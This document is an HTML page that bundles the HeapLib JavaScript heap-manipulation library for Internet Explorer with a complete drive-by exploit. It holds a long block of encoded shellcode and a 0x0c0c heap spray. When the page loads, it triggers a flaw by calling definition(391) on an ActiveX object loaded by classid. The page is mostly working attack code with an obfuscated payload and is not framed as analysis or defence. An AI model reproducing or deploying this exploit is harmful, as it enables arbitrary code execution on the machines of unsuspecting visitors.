	<html>
	<head>
	<script>
	//
//   JavaScript Heap Exploitation library
//   by Alexander Sotirov <asotirov@determina.com>
//  
//   Version 0.3
//
// Copyright (c) 2007, Alexander Sotirov
// All rights reserved.
// 
// The HeapLib library is licensed under a BSD license, the text of which follows:
// 
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions
// are met:
// 
// 1. Redistributions of source code must retain the above copyright
//    notice, this list of conditions and the following disclaimer.
// 2. Redistributions in binary form must reproduce the above copyright
//    notice, this list of conditions and the following disclaimer in the
//    documentation and/or other materials provided with the distribution.
// 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
//    may be used to endorse or promote products derived from this software
//    without specific prior written permission.
// 
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
// ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
// LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
// CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
// SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
// INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
// CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
// ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
// POSSIBILITY OF SUCH DAMAGE.
//
 
//
// heapLib namespace
//

function heapLib() {
}


//
// heapLib class
//

// heapLib.ie constructor
//
// Creates a new heapLib API object for Internet Explorer. The maxAlloc
// argument sets the maximum block size that can be allocated using the alloc()
// function.
//
// Arguments:
//    maxAlloc - maximum allocation size in bytes (defaults to 65535)
//    heapBase - base of the default process heap (defaults to 0x150000)
//

heapLib.ie = function(maxAlloc, heapBase) {

    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
    this.heapBase = (heapBase ? heapBase : 0x150000);

    // Allocate a padding string that uses maxAlloc bytes
    this.paddingStr = "AAAA";

    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
        this.paddingStr += this.paddingStr;
    }
    
    // Create an array for storing references to allocated memory
    this.mem = new Array();

    // Call flushOleaut32() once to allocate the maximum size blocks
    this.flushOleaut32();
}


//
// Outputs a debugging message in WinDbg. The msg argument must be a string
// literal. Using string concatenation to build the message will result in heap
// allocations.
//
// Arguments:
//    msg - string to output
//

heapLib.ie.prototype.debug = function(msg) {
    void(Math.atan2(0xbabe, msg));
}


//
// Enables or disables logging of heap operations in WinDbg.
//
// Arguments:
//    enable - a boolean value, set to true to enable heap logging
//

heapLib.ie.prototype.debugHeap = function(enable) {

    if (enable == true)
        void(Math.atan(0xbabe));
    else
        void(Math.asin(0xbabe));
}


//
// Triggers a breakpoint in the debugger.
//

heapLib.ie.prototype.debugBreak = function(msg) {
    void(Math.acos(0xbabe));
}


//
// Returns a string of a specified length, up to the maximum allocation size
// set in the heapLib.ie constructor. The string contains "A" characters.
//
// Arguments:
//    len - length in characters
//

heapLib.ie.prototype.padding = function(len) {
    if (len > this.paddingStr.length)
        throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";

    return this.paddingStr.substr(0, len);
}


//
// Returns a number rounded up to a specified value.
//
// Arguments:
//    num   - integer to round
//    round - value to round to
//

heapLib.ie.prototype.round = function(num, round) {
    if (round == 0)
        throw "Round argument cannot be 0";

    return parseInt((num + (round-1)) / round) * round;
}


//
// Converts an integer to a hex string. This function uses the heap.
//
// Arguments:
//    num   - integer to convert
//    width - pad the output with zeros to a specified width (optional)
//

heapLib.ie.prototype.hex = function(num, width)
{
    var digits = "0123456789ABCDEF";

    var hex = digits.substr(num & 0xF, 1);

    while (num > 0xF) {
        num = num >>> 4;
        hex = digits.substr(num & 0xF, 1) + hex;
    }

    var width = (width ? width : 0);

    while (hex.length < width)
        hex = "0" + hex;

    return hex;
}


//
// Convert a 32-bit address to a 4-byte string with the same representation in
// memory. This function uses the heap.
//
// Arguments:
//    addr - integer representation of the address
//

heapLib.ie.prototype.addr = function(addr) {
    return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
}


//
// Allocates a block of a specified size with the OLEAUT32 alloc function.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    // Create an array for this tag if doesn't already exist
    if (this.mem[tag] === undefined)
        this.mem[tag] = new Array();

    if (typeof arg == "string" || arg instanceof String) {
        // Allocate a new block with strdup of the string argument
        this.mem[tag].push(arg.substr(0, arg.length));
    }
    else {
        // Allocate the block
        this.mem[tag].push(this.padding((arg-6)/2));
    }
}


//
// Frees all memory blocks marked with a specific tag with the OLEAUT32 memory
// allocator.
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.freeOleaut32 = function(tag) {

    delete this.mem[tag];
    
    // Run the garbage collector
    CollectGarbage();
}


//
// The JScript interpreter uses the OLEAUT32 memory allocator for all string
// allocations. This allocator stores freed blocks in a cache and reuses them
// for later allocations. The cache consists of 4 bins, each storing up to 6
// blocks. Each bin holds blocks of a certain size range:
//
//    0 - 32
//    33 - 64
//    65 - 256
//    257 - 32768
//
// When a block is freed by the OLEAUT32 free function, it is stored in one of
// the bins. If the bin is full, the smallest block in the bin is freed with
// RtlFreeHeap() and is replaced with the new block. Chunks larger than 32768
// bytes are not cached and are freed directly.
//
// To flush the cache, we need to free 6 blocks of the maximum size for each
// bin. The maximum size blocks will push out all smaller blocks from the
// cache. Then we allocate the maximum size blocks again, leaving the cache
// empty.
//
// You need to call this function once to allocate the maximum size blocks
// before you can use it to flush the cache.
//

heapLib.ie.prototype.flushOleaut32 = function() {

    this.debug("Flushing the OLEAUT32 cache");

    // Free the maximum size blocks and push out all smaller blocks

    this.freeOleaut32("oleaut32");
    
    // Allocate the maximum sized blocks again, emptying the cache

    for (var i = 0; i < 6; i++) {
        this.allocOleaut32(32, "oleaut32");
        this.allocOleaut32(64, "oleaut32");
        this.allocOleaut32(256, "oleaut32");
        this.allocOleaut32(32768, "oleaut32");
    }
}


//
// Allocates a block of a specified size with the system memory allocator. A
// call to this function is equivalent to a call to HeapAlloc(). If the first
// argument is a number, it specifies the size of the new block, which is
// filled with "A" characters. If the argument is a string, its data is copied
// into a new block of size arg.length * 2 + 6. In both cases the size of the
// new block must be a multiple of 16 and not equal to 32, 64, 256 or 32768.
//
// Arguments:
//    arg - size of the memory block in bytes, or a string to strdup
//    tag - a tag identifying the memory block (optional)
//

heapLib.ie.prototype.alloc = function(arg, tag) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if (size == 32 || size == 64 || size == 256 || size == 32768)
        throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";

    // Allocate the block with the OLEAUT32 allocator
    this.allocOleaut32(arg, tag);
}


//
// Frees all memory blocks marked with a specific tag with the system memory
// allocator. A call to this function is equivalent to a call to HeapFree().
//
// Arguments:
//    tag - a tag identifying the group of blocks to be freed
//

heapLib.ie.prototype.free = function(tag) {

    // Free the blocks with the OLEAUT32 free function
    this.freeOleaut32(tag);

    // Flush the OLEAUT32 cache
    this.flushOleaut32();
}


//
// Runs the garbage collector and flushes the OLEAUT32 cache. Call this
// function before before using alloc() and free().
//

heapLib.ie.prototype.gc = function() {

    this.debug("Running the garbage collector");
    CollectGarbage();

    this.flushOleaut32();
}


//
// Adds blocks of the specified size to the free list and makes sure they are
// not coalesced. The heap must be defragmented before calling this function.
// If the size of the memory blocks is less than 1024, you have to make sure
// that the lookaside is full.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many free blocks to add to the list (defaults to 1)
//

heapLib.ie.prototype.freeList = function(arg, count) {

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++) {
        this.alloc(arg);
        this.alloc(arg, "freeList");
    }
    this.alloc(arg);

    this.free("freeList");
}


//
// Add blocks of the specified size to the lookaside. The lookaside must be
// empty before calling this function.
//
// Arguments:
//    arg    - size of the new block in bytes, or a string to strdup
//    count  - how many blocks to add to the lookaside (defaults to 1)
//

heapLib.ie.prototype.lookaside = function(arg, count) {

    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    var count = (count ? count : 1);

    for (var i = 0; i < count; i++)
        this.alloc(arg, "lookaside");

    this.free("lookaside");
}


//
// Return the address of the head of the lookaside linked list for blocks of a
// specified size. Uses the heapBase parameter from the heapLib.ie constructor.
//
// Arguments:
//    arg - size of the new block in bytes, or a string to strdup
//

heapLib.ie.prototype.lookasideAddr = function(arg)
{
    var size;

    // Calculate the allocation size
    if (typeof arg == "string" || arg instanceof String)
        size = 4 + arg.length*2 + 2;    // len + string data + null terminator
    else
        size = arg;

    // Make sure that the size is valid
    if ((size & 0xf) != 0)
        throw "Allocation size " + size + " must be a multiple of 16";

    if (size+8 >= 1024)
        throw("Maximum lookaside block size is 1008 bytes");

    // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
    // structure for each block size + header size in 8 byte increments.

    return this.heapBase + 0x688 + ((size+8)/8)*48;
}


//
// Returns a fake vtable that contains shellcode. The caller should free the
// vtable to the lookaside and use the address of the lookaside head as an
// object pointer. When the vtable is used, the address of the object must be
// in eax and the pointer to the vtable must be in ecx. Any virtual function
// call through the vtable from ecx+8 to ecx+0x80 will result in shellcode
// execution. This function uses the heap.
//
// Arguments:
//    shellcode - shellcode string
//    jmpecx    - address of a jmp ecx or equivalent instruction
//    size      - size of the vtable to generate (defaults to 1008 bytes)
//

heapLib.ie.prototype.vtable = function(shellcode, jmpecx, size) {

    var size = (size ? size : 1008);

    // Make sure the size is valid
    if ((size & 0xf) != 0)
        throw "Vtable size " + size + " must be a multiple of 16";

    if (shellcode.length*2 > size-138)
        throw("Maximum shellcode length is " + (size-138) + " bytes");

    // Build the fake vtable that will go on the lookaside list
    //
    // lookaside ptr  jmp +124  addr of jmp ecx  sub [eax], al*2  shellcode       null
    // 4 bytes        4 bytes   124 bytes        4 bytes          size-138 bytes  2 bytes

    var vtable = unescape("%u9090%u7ceb")   // nop, nop, jmp + 124

    for (var i = 0; i < 124/4; i++)
        vtable += this.addr(jmpecx);

    // If the vtable is the only entry on the lookaside, the first 4 bytes will
    // be 00 00 00 00, which disassembles as two add [eax], al instructions.
    // The jmp ecx trampoline will jump back to the beginning of the vtable and
    // execute the add [eax], al instructions. We need to use two sub [eax], al
    // instructions to fix the heap.

    vtable += unescape("%u0028%u0028") +    // two sub [eax], al instructions
              shellcode + heap.padding((size-138)/2 - shellcode.length);

    return vtable;
}

	var heap_obj = new heapLib.ie(0x20000);
	var code = unescape("%u0d24%u66ba%u2c91%ue332%uf539%u7504%u0c71%ub799%ub843%ub3b0%u37b1%ua8b2%u4176%u157e%u461c%ue020%u4705%ub9be%u4096%u4879%u92bb%u9fb6%ufd88%ud42a%u7734%ub53f%ufc80%u2872%ue2d3%u813c%u78d6%u1873%ubff8%u8490%u76eb%ud233%ub8d6%uf685%u72e1%u4f0c%u4966%ud569%u3f42%u0d7b%ud10b%u92f8%u74bb%u401c%u983d%ub915%ub7b5%uba27%u2cbe%u9996%ue389%uf721%ue0d3%u9f41%ubf3c%u709b%ue231%u6779%u4325%u4b35%u4a04%u2d7a%u7f24%uf51b%u75b0%u2f7c%u48a8%ufd32%u9391%u468d%u34b2%u7e77%u3005%ub1d4%u711d%u4e14%u7da9%ufc08%u4797%ub637%u7378%uf922%ub3b4%ueb80%u1d48%u417c%u3b7f%u87f5%ue2d0%u2d74%u2575%u8142%uc1fe%u7ee1%u7970%ub904%ub8ba%u76b4%u6772%u3405%uf912%u350c%u960d%u8490%ubfd4%u2743%u4fb7%ub29f%u983d%u9b4b%uf83a%u9291%u19b1%u6be3%u7dfd%u7b2f%ud513%u77a9%u973c%ue00a%u1c24%u6671%u18b5%u4afc%ubba8%u994e%ud629%u462c%u37b0%u403f%ub6be%u4793%ub314%u8d49%u157a%u7a78%u7f72%u0c76%u9f25%ueb8c%u6704%u968d%u4bbb%ub592%u6679%ue328%ufd20%u9915%u3d42%ubf91%u489b%u2fb2%u277e%ue109%uf52b%u4098%u4175%u4e7b%u1a14%u38fc%u0de0%u9747%u2cb9%uff86%uc0c6%u46d4%u39a8%u23e2%u33f9%u1dd6%u9049%u2d77%u704a%u2a7c%u93d5%u37b6%u1cba%u3f74%ub405%ub835%uf811%u7db1%u2473%u71b7%ub334%ub03c%u4fa9%u43be%u7a76%u377f%ubf3c%u2d25%ub9bb%ue301%u9166%u679b%u247d%ub8b2%u7779%ub14b%u969f%uf588%ue283%uf703%u46e1%u4974%ufd02%u9315%u99b3%ub6ba%u427e%u7b7c%u1004%ua8f9%u0147%u31eb%u27f8%u1c75%u1173%u03e0%u98fc%u4f1d%ubeb5%ub4a9%u7248%u052c%ud423%u902f%ub00d%u14b7%u3371%u0cd5%ud680%u4178%u703f%u4340%u4e97%u928d%u4a34%u353d%u7375%ua90c%u9127%u9047%ub966%u2c7d%u8d24%ue009%u7f34%u4e72%ubab4%uf921%u9f96%u6b49%ub3d6%u929b%u0497%u4670%u86b2%u37f5%u2d1c%ufd88%u0579%ub067%u184f%u0beb%ud2c1%u7bd4%u993c%ue283%u7414%ub815%ue108%ub740%u4ab1%u7cbf%u4341%u7ebe%u292f%u35e3%u3d76%u2a42%u77f8%u3f78%u7a0d%u2248%ud5f6%ufc02%u254b%u1d71%u93b6%ua8bb%ub598%u788d%u757a%u8143%u38e0%u1be1%ue3c0%u777d%u974b%ub8bb%ubab5%u96b3%u74b4%u3534%u2c3d%u6671%ube15%ud512%u2746%u2d76%u7c90%u7b72%u697e%ud0d3%ub1fd%u0a4a%u9ffc%u1ab6%u9bd6%ua993%u190d%u04e2%u7079%u4f73%uf889%u3abf%u30f9%u37eb%u673f%ua8b7%u7fb9%uf513%u2f0c%u9842%ub091%ud432%u4e7f%u1d77%u7999%u7024%u7b3c%u7448%ub249%u1473%u257a%ue085%u9247%ue18c%ud128%u1ce2%u4178%u3976%u05eb%ue384%u7e40%u7d3d%u923f%u0c90%uf520%u3572%u34b8%u4941%u7547%u661c%u9837%ub524%u0571%ub7b6%ub293%u998d%u7c9b%ubb15%u1d67%u9643%uf910%u402f%u42bf%u974b%u2d48%u3cba%u4aa8%ubeb4%u2bd4%u91d5%u27a9%u4f2c%u04fc%u250d%ub046%ub914%u4eb1%u87d6%ub3f8%u3b9f%ud9fd%ud9eb%u2474%u5ff4%u8bbb%u0585%u3199%ub1c9%u3132%u175f%uef83%u03fc%u96d4%u6ce7%u7016%u8e6e%u81e6%u0611%ub003%u7c03%ue140%uf693%u0a04%u5a5f%u99bc%u732d%u2ab3%ua59b%uabfa%u6a2d%u6f50%u162f%ubcaa%u278f%ub165%u60ce%u3a9b%u3982%ue9d0%u4d33%u31a4%u8135%u0aa3%ua44d%ufe73%ua7e7%uafa3%uef7c%udb5b%ud0db%u085a%u2c38%u2515%uc68b%uefa4%u27c5%ucf97%u198a%uc218%u5ed3%u3d9e%u94a6%uc0dd%u6eb1%u1e9c%u7337%ud406%u57ef%u39b7%u1369%uf6bb%u7bfd%u09df%uf7d1%u82db%ud7d4%ud06a%uf3f2%u8237%ua29b%u659d%ub5a3%ud979%ubd01%u0e6b%u9c33%ud1e1%u9ab1%ud14c%ua4c9%ubafe%u2ff8%ubd91%ufa04%u32d6%ua74f%udb7e%u3d16%u86c3%ueba8%ubf07%u1e2a%u44f7%u6b32%u01f2%u87f4%u1a8e%ua791%u1a3d%ucbb0%u88a0%u0c58");
	var nops = unescape("%u0c0c%u0c0c");

	while (nops.length < 0x80000) nops += nops;
	var offset = nops.substring(0, 0x800 - code.length);
	var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

	while (shellcode.length < 0x40000) shellcode += shellcode;
	var block = shellcode.substring(0, (0x80000-6)/2);

	heap_obj.gc();

	for (var i=1; i < 0xa70; i++) {
		heap_obj.alloc(block);
	}


	</script>
	</head>
	<body>
	<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id="FVry"></object><script>
	document.getElementById("FVry").object.definition(391);
	</script>
	</body>
	</html>
